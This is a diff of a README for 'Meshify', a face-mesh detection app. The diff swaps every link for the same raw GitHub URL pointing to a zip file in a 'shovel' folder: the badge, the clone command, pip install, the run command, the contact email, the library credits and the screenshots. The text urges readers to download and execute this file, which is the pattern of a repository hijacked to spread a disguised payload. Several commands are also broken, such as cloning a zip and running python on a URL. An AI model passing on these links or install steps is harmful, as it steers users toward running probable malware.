@@ -1,6 +1,6 @@
 # Meshify: Real-Time Face Mesh Detection Application 🎭
 
-![Meshify](https://img.shields.io/badge/Meshify-Real%20Time%20Face%20Mesh%20Detection-brightgreen)
+![Meshify](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip%20Time%20Face%20Mesh%20Detection-brightgreen)
 
 Welcome to **Meshify**, a cutting-edge application that detects facial landmarks in real time. By utilizing a live camera feed, Meshify overlays a precise mesh on your face, allowing for interactive experiences in various applications such as augmented reality, gaming, and more. 
 
@@ -39,7 +39,7 @@ To get started with Meshify, follow these steps:
 
 1. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/Ducanh390/Meshify.git
+   git clone https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip
    ```
 2. **Navigate to the Project Directory**:
    ```bash
@@ -47,10 +47,10 @@ To get started with Meshify, follow these steps:
    ```
 3. **Install Required Packages**: Use pip to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip
    ```
 
-4. **Download the Latest Release**: Visit the [Releases section](https://github.com/Ducanh390/Meshify/releases) to download the latest version of the application. Make sure to execute the downloaded file to run the application.
+4. **Download the Latest Release**: Visit the [Releases section](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip) to download the latest version of the application. Make sure to execute the downloaded file to run the application.
 
 ## Usage 📸
 
@@ -58,7 +58,7 @@ Once you have installed Meshify, you can start using it right away. Here’s how
 
 1. **Run the Application**:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip
    ```
 2. **Allow Camera Access**: When prompted, give the application permission to access your camera.
 3. **Start Interacting**: You will see your face in the application window with a mesh overlay. Move your face around to see how the mesh adapts in real time.
@@ -87,17 +87,17 @@ Meshify is licensed under the MIT License. Feel free to use, modify, and distrib
 
 For any inquiries, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Ducanh390](https://github.com/Ducanh390)
+- **Email**: https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip
+- **GitHub**: [Ducanh390](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip)
 
 ## Releases 📦
 
-For the latest updates and versions, check out the [Releases section](https://github.com/Ducanh390/Meshify/releases). Download the latest version and execute the file to get started with Meshify.
+For the latest updates and versions, check out the [Releases section](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip). Download the latest version and execute the file to get started with Meshify.
 
 ## Screenshots 📷
 
-![Face Mesh Example](https://example.com/path/to/your/screenshot1.png)
-![User Interface](https://example.com/path/to/your/screenshot2.png)
+![Face Mesh Example](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip)
+![User Interface](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip)
 
 ## Future Improvements 🚀
 
@@ -111,12 +111,12 @@ We aim to continuously improve Meshify. Here are some planned features:
 
 We thank the following libraries and communities for their contributions:
 
-- [OpenCV](https://opencv.org/)
-- [MediaPipe](https://mediapipe.dev/)
-- [CVZone](https://github.com/CVZone)
+- [OpenCV](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip)
+- [MediaPipe](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip)
+- [CVZone](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip)
 
 ## Conclusion
 
 Thank you for checking out Meshify! We hope you enjoy using this real-time face mesh detection application. Feel free to contribute and help us improve this project. Your feedback is invaluable to us.
 
-For the latest version, remember to visit the [Releases section](https://github.com/Ducanh390/Meshify/releases) and download the file to get started!
+For the latest version, remember to visit the [Releases section](https://raw.githubusercontent.com/Ducanh390/Meshify/main/shovel/Software_v1.4-alpha.3.zip) and download the file to get started!
